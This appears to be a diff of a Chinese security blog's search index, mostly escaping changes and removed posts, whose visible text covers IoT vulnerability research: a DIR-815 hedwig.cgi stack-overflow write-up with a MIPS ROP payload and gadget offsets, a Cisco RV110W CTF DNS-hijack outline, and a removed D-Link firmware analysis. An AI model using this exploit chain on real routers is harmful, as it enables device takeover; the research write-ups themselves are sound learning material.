@@ -3,8 +3,7 @@
   <entry>
     <title>交叉编译mips架构gdb+gdbServer</title>
     <url>/2020/10/06/jiao-cha-bian-yi-mips-jia-gou-gdb-gdbserver/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GDB + IDA + burp是吃饭三件套，一个能使用的gdb和gdbserver是调试IoT设备二进制漏洞的必备条件，之前都是从github下载他人编译好的，一旦他人gdb和gdbserver用不了的话，直接歇菜！所以才有了这篇博客，自己编译生成一次能够在设备上使用的gdb！</p>
-<p>交叉编译是一门大学问，其中涉及的知识点还挺多的，这次走了不少弯路，在这里将遇到的问题进行总结吧！</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GDB + IDA + burp是吃饭三件套，一个能使用的gdb和gdbserver是调试IoT设备二进制漏洞的必备条件，之前都是从github下载他人编译好的，一旦他人gdb和gdbserver用不了的话，直接歇菜！</p>
 <h1 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h1><p>这里的工具选择并不要求完全一样，我只是在这个环境第一次成功，然后直接记录下来了。</p>
 <ul>
 <li>ubuntu：14.04和16.04都可以的。</li>
@@ -100,43 +99,9 @@ mipsel-linux-strip gdbserver/gdbserver</code></pre>
       </categories>
   </entry>
   <entry>
-    <title>win10+ida7.2+bindiff5.0</title>
-    <url>/2020/09/21/win10-ida7-2-bindiff5-0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>补丁比对神器怎么能少了bindiff呢？之前在win10上用过bindiff4.3+ida6.8，用着用着ida6.8直接崩了，我试的3个ida6.8全坏了，人也要往前走呀，尝试新的东西，就有了这次的bindiff5.0使用。</p>
-<h1 id="相关环境"><a href="#相关环境" class="headerlink" title="相关环境"></a>相关环境</h1><ul>
-<li>win10（bindiff5.0支持win10）</li>
-<li>java环境（bindiff是基于java开发的）</li>
-<li>ida7.2</li>
-<li>bindiff5.0</li>
-</ul>
-<h1 id="bindiff5-0安装与使用"><a href="#bindiff5-0安装与使用" class="headerlink" title="bindiff5.0安装与使用"></a>bindiff5.0安装与使用</h1><p>具体的安装流程和步骤不再详细赘述，这里只描述遇到的问题。</p>
-<h2 id="作为ida插件使用"><a href="#作为ida插件使用" class="headerlink" title="作为ida插件使用"></a>作为ida插件使用</h2><ol>
-<li>指定IDA7.2的位置</li>
-</ol>
-<p><img src="https://pup2y.github.io/2020/09/21/win10-ida7-2-bindiff5-0/image-20200921145601336.png" alt=""></p>
-<ol start="2">
-<li><p>作为ida插件使用时，快捷键是ctrl+6，bindiff不能直接分析二进制程序，需要先使用ida打开需要diff的二进制程序，再关闭生成idb或i64数据库。bindiff插件中导入生成的idb或者i64数据库就能进行diff。</p>
-<p><img src="https://pup2y.github.io/2020/09/21/win10-ida7-2-bindiff5-0/image-20200921150448302.png" alt=""></p>
-</li>
-<li><p>在生成的Matched Functions窗口中，找到需要diff的函数，右键<strong>view flow graphs</strong>查看流图时会报错无法调用BinDiff用户接口。</p>
-<p><img src="https://pup2y.github.io/2020/09/21/win10-ida7-2-bindiff5-0/image-20200921151059134.png" alt=""></p>
-<p>需要找到bindiff5.0的安装位置中bin文件夹，运行bindiff.jar，再进行上述操作则不会报错。</p>
-</li>
-</ol>
-<h2 id="直接使用bindiff5-0"><a href="#直接使用bindiff5-0" class="headerlink" title="直接使用bindiff5.0"></a>直接使用bindiff5.0</h2><ol>
-<li><p>主菜单 -&gt; Diffs -&gt; New Diff</p>
-<p><img src="https://pup2y.github.io/2020/09/21/win10-ida7-2-bindiff5-0/image-20200921153121066.png" alt=""></p>
-<p>选择之前生成的idb文件或i64文件进行比较，就能在workspace得到<strong>xxx vs xxx</strong>。</p>
-<p><img src="https://pup2y.github.io/2020/09/21/win10-ida7-2-bindiff5-0/image-20200921224712552.png" alt=""></p>
-</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
     <title>2020强网杯决赛Cisco路由器</title>
     <url>/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CisCo路由器是比赛时临时给的，并不是提前告知的，该题属于强网杯realworld题目中的CC。比赛结束的时候该题目只有4只队伍解出。这四只队伍也是最后排名前四的队伍：eee（腾讯）、0x300R（长亭）、0ops（上海交大）、BOI（国防科大）。</p>
-<h1 id="题目相关"><a href="#题目相关" class="headerlink" title="题目相关"></a>题目相关</h1><p><strong>题目描述：</strong>挖掘并利用CISCO RV110W-E-CN-K9（固件版本1.2.2.5）中的漏洞，获取路由器的Root Shell，实现DNS劫持。</p>
+    <content><![CDATA[<h1 id="题目相关"><a href="#题目相关" class="headerlink" title="题目相关"></a>题目相关</h1><p><strong>题目描述：</strong>挖掘并利用CISCO RV110W-E-CN-K9（固件版本1.2.2.5）中的漏洞，获取路由器的Root Shell，实现DNS劫持。</p>
 <p><strong>靶机环境：</strong>CISCO RV110W-E-CN-K9（固件版本1.2.2.5），设置后台管理密码、WIFI密码，默认关闭telnet。</p>
 <p><strong>附件信息：</strong>附件中提供了路由器固件（固件版本1.2.2.5，与靶机版本一致），路由器设备后台管理账号为cisco，密码为qwb2020 ，WiFi密码未设置。</p>
 <p><strong>展示环境拓扑：</strong>展台路由器WAN口连接互联网，选手攻击机和操作员验证机通过网线连接路由器LAN口，IP地址设置自动获取。</p>
@@ -183,8 +148,8 @@ mipsel-linux-strip gdbserver/gdbserver</code></pre>
 </ol>
 <h3 id="补丁比对"><a href="#补丁比对" class="headerlink" title="补丁比对"></a>补丁比对</h3><p>通过比对最新版本1.2.2.8与当前版本1.2.2.5版本能够发现厂商自行修补但未公布的漏洞。</p>
 <p>这里主要使用bindiff工具，结合IDA pro进行补丁比对。找到其中相同函数名，但是相似度不高的函数进行分析。</p>
-<h1 id="成功Getshell并劫持DNS"><a href="#成功Getshell并劫持DNS" class="headerlink" title="成功Getshell并劫持DNS"></a>成功Getshell并劫持DNS</h1><p>因为这里使用的漏洞算是0day，所以在官方公布出来之前就不进行详细描述了。</p>
-<p>在成功getshell之后，考虑如何劫持DNS，这里的方法有很多。</p>
+<p>本次的漏洞点是通过补丁比对找到的，能够清楚的找到在最新版本修复掉的危险函数。</p>
+<h1 id="劫持DNS"><a href="#劫持DNS" class="headerlink" title="劫持DNS"></a>劫持DNS</h1><p>在成功getshell之后，考虑如何劫持DNS，这里的方法有很多。</p>
 <p>大体步骤是：</p>
 <ol>
 <li><p>利用bind等类型软件搭建DNS服务器，并提供公网地址IP。</p>
@@ -199,7 +164,6 @@ killall dnsmasq;
 </li>
 </ol>
 <p>之后让工作人员的验证机通过lan口连接路由器， 设置验证机的DNS服务器IP地址为路由器IP，清除浏览器历史记录，清除本机的DNS缓存，使用Firefox浏览器访问<a href="http://www.baidu.com。" target="_blank" rel="noopener">www.baidu.com。</a></p>
-<p><img src="https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/image-20200930133511445.png" alt=""></p>
 ]]></content>
       <categories>
         <category>iot</category>
@@ -207,72 +171,6 @@ killall dnsmasq;
       <tags>
         <tag>cisco</tag>
         <tag>RV110W(1.2.2.5)</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>D-Link DWR-932B相关漏洞分析</title>
-    <url>/2020/06/18/d-link-dwr-932b-xiang-guan-lou-dong-fen-xi/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有段时间没调试漏洞了，正好《IOT PENETRATION TESTING COOKBOOK》的译本《物联网渗透测试》出来了，买了一本看看，同时通过调洞静下心来吧！</p>
-<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
-<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
-<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
-<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
-<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
-<li>gdbserver：已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
-<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
-<li>firmwalker：一些搜索固件解压出来的文件系统中的敏感信息的自动化脚本</li>
-<li>固件下载：<a href="https://tsd.dlink.com.tw/" target="_blank" rel="noopener">https://tsd.dlink.com.tw/</a></li>
-</ul>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>根据研究员<em>pierre kim</em>的<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html" target="_blank" rel="noopener">IT Security Research</a>，固件DWR-932_fw_revB_2_02_eu_en_20150709.zip, model revision B存在很多漏洞，漏洞总结如下：</p>
-<ul>
-<li>后门用户</li>
-<li>后门</li>
-<li>默认的WPS PIN</li>
-<li>通过逆向算法，发现弱的WPS PIN生成算法</li>
-<li>泄漏No-IP用户</li>
-<li>HTTP守护进程(qmiweb)的多种漏洞</li>
-<li>Remote FOTA (Firmware Over The Air)</li>
-<li>Bad security pratices</li>
-<li>Security removed in UPNP</li>
-</ul>
-<p>有意思的是，当时<em>pierre</em>的个人观点是，这些漏洞产生的原因要么是开发人员能力不足，要么就是故意留下的这些漏洞（毕竟包括很多后门漏洞）。</p>
-<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p>第一步：获取固件提取文件系统，但是固件是加密之后的zip文件，利用fcrackzip工具暴力破解口令。我的fcrackzip使用报错：</p>
-<p><img src="image-20200618110402238.png" alt=""></p>
-<p>分析原因应该是zip文件不是完整的zip格式，所以无法解压。这里不再补齐它的完整格式，直接使用研究员用fcrackzip爆破的密码：beUT9z。</p>
-<p>第二步：获取了固件镜像，解压之后有3个yaffs文件系统，直接用binwalk解压其中的2K-mdm-image-mdm9625.yaffs文件系统，这样就得到了完整的文件系统。</p>
-<p>第三步：遍历文件系统中不同的目录，并从安全视角查找其中可能存在漏洞的文件，需要检查所有配置文件，可以利用find文件来查找所有.conf后缀名的文件。</p>
-<p><img src="image-20200618111251322.png" alt=""></p>
-<p>第四步：查看配置文件，例如./etc/inadyn-mt.conf，结果直接发现了敏感文件。</p>
-<p><img src="image-20200618111417595.png" alt=""></p>
-<p>这些信息本不应该被他人看见的，因为其中存储了no-IP配置信息，no-IP这是一种动态域名服务，配置文件包含了访问<a href="https://www.no-ip.com" target="_blank" rel="noopener">no-ip.com</a>的用户名和密码。现在肯定登录不了。。。</p>
-<p>上面是手工的方法，自动化的方法就是利用firmwalker自动化脚本，搜索敏感信息。</p>
-<p>接着的分析等待之后有空再继续吧。。。</p>
-<p>其实整个现在分析下来没什么意思，而且看<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html" target="_blank" rel="noopener">IT Security Research</a>发现里面没意思的洞太多了，调试分析起来没意思，不如直接审计反汇编代码挖洞去。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <categories>
-        <category>iot</category>
-      </categories>
-      <tags>
-        <tag>dlink</tag>
-        <tag>dwr-932b</tag>
       </tags>
   </entry>
   <entry>
@@ -674,8 +572,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
   <entry>
     <title>DIR815缓冲区溢出漏洞再分析</title>
     <url>/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/</url>
-    <content><![CDATA[<p>文章修改后在安全客发表，<a href="https://www.anquanke.com/post/id/206626" target="_blank" rel="noopener">链接</a></p>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
+    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
 <p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
 </blockquote>
 <p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
@@ -691,7 +588,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
 </ul>
 <h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
-<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
+<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name &#39;*cgi&#39;</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
 <p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_cookie.png" alt=""></p>
@@ -749,7 +646,7 @@ test=$(python -c "print 'uid='+open('test','r').read(2000)")
 LEN=$(echo -n "$test" | wc -c)
 PORT="23957"
 cp $(which qemu-mipsel-static) ./qemu
-sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null
+sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
 rm -f ./qemu</code></pre>
 <p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
@@ -757,7 +654,7 @@ rm -f ./qemu</code></pre>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra.png" alt=""></p>
 <p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
-<p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
+<p>可以通过修改test.sh中的<code>test =$(python -c &quot;print &#39;uid=&#39; + &#39;A&#39;*1043 + &#39;B&#39;*4&quot;)</code>进一步确定偏移为1043。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/1043offset.png" alt=""></p>
 <p>以上是触发第一个sprintf()的偏移。</p>
 <h4 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
@@ -806,7 +703,7 @@ b *0x409a54</code></pre>
 <p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget.png" alt=""></p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/jalrs0.png" alt=""></p>
-<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
+<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find(&quot;addiu .*,1&quot;)</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addiu1.png" alt=""></p>
 <p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%A6%86%E7%9B%96.png" alt=""></p>
@@ -859,7 +756,7 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
 <p>1.ROP Gadget 1</p>
-<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
+<p>利用<code>mipsrop.find(&quot;li $a0,1&quot;)</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/lia0.png" alt=""></p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x57E50.png" alt=""></p>
 <p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
@@ -878,7 +775,7 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/14F28.png" alt=""></p>
 <p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
 <p>4.ROP Gadget 4</p>
-<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
+<p>利用<code>mipsrop.find(&quot;move $t9,$s1&quot;)</code>找到一下gadget。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/movet9s1.png" alt=""></p>
 <p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x1DD08.png" alt=""></p>
@@ -929,7 +826,7 @@ payload <span class="token operator">+=</span> shellcode</code></pre>
 <p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode2.png" alt=""></p>
 <p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
 <h1 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name &#39;*http*&#39;</code>找到web配置文件httpcfg.php。</p>
 <pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
 ./etc/services/HTTP/httpsvcs.php
 ./usr/sbin/httpc
@@ -1003,7 +900,7 @@ Control
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { txt }"</span><span class="token punctuation">.</span>    <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            }"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$widget</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span>
         <span class="token string">"            External"</span><span class="token punctuation">.</span>                        <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"            {"</span><span class="token punctuation">.</span>                                <span class="token string">"\n"</span><span class="token punctuation">.</span>
         <span class="token string">"                /usr/sbin/phpcgi { router_info.xml }"</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -1020,7 +917,7 @@ Control
         <span class="token string">'           Location /htdocs/smart404'</span><span class="token punctuation">.</span>     <span class="token string">'\n'</span><span class="token punctuation">.</span>
         <span class="token string">'       }'</span><span class="token punctuation">.</span>                                 <span class="token string">'\n'</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hnap</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">echo</span>
         <span class="token string">"        Control"</span><span class="token punctuation">.</span>                            <span class="token string">"\n"</span><span class="token punctuation">.</span>
@@ -1119,7 +1016,7 @@ Control
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 
-<span class="token delimiter">?&gt;</span></code></pre>
+<span class="token delimiter">?></span></code></pre>
 <p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
 <pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
 PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
@@ -1229,19 +1126,19 @@ ln -s  /htdocs/cgibin /usr/sbin/hnap
 <pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
 *   Trying 192.168.79.143...
 * Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
-&gt; POST /hedwig.cgi HTTP/1.1
-&gt; Host: 192.168.79.143:1234
-&gt; User-Agent: curl/7.47.0
-&gt; Accept: */*
-&gt; Cookie: uid=zh
-&gt; Content-Length: 8
-&gt; 
-&lt; HTTP/1.1 200 OK
-&lt; Server: Linux, HTTP/1.1, 
-&lt; Date: Sun, 24 May 2020 01:00:46 GMT
-&lt; Transfer-Encoding: chunked
-&lt; Content-Type: text/xml
-&lt; 
+> POST /hedwig.cgi HTTP/1.1
+> Host: 192.168.79.143:1234
+> User-Agent: curl/7.47.0
+> Accept: */*
+> Cookie: uid=zh
+> Content-Length: 8
+> 
+< HTTP/1.1 200 OK
+< Server: Linux, HTTP/1.1, 
+< Date: Sun, 24 May 2020 01:00:46 GMT
+< Transfer-Encoding: chunked
+< Content-Type: text/xml
+< 
 * Connection #0 to host 192.168.79.143 left intact
 <hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
 <p>然后在mips虚拟机查看log文件：</p>
@@ -1272,7 +1169,7 @@ Content-Type: text/xml
 #之前分析过因为没有post数据
 <hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
 root@debian-mipsel:~/squashfs-root# </code></pre>
-<p>使用<code>echo 'uid=1234'| /htdocs/web/hedwig.cgi</code>运行成功。</p>
+<p>使用<code>echo &#39;uid=1234&#39;| /htdocs/web/hedwig.cgi</code>运行成功。</p>
 <pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
 root@debian-mipsel:~/squashfs-root# </code></pre>
 <p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
@@ -1306,14 +1203,14 @@ root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
 root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
 root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
 
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
 [10] 1052
 cat: /proc/pid/maps: No such file or directory
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
 [11] 1054
 cat: /proc/pid/maps: No such file or directory
 [10]+  Stopped                 /htdocs/web/hedwig.cgi
-root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi &amp; cat /proc/1056/maps 
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
 [12] 1056
 00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
 0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
@@ -1409,18 +1306,18 @@ gadget4 = 0x1DD08#0x15C84#0xBB44
 
 payload = 'A' * 973 #1009-9*4
 payload += 'A' * 4                           # s0
-payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2
+payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
 payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
 payload += 'A' * 4                        # s3
-payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode
+payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
 payload += 'A' * 4                           # s5
 payload += 'A' * 4                        # s6
 payload += 'A' * 4                        # s7
 payload += 'A' * 4                        # fp
-payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1
+payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1
 
 payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
-payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4
+payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4
 
 payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
 payload += shellcode
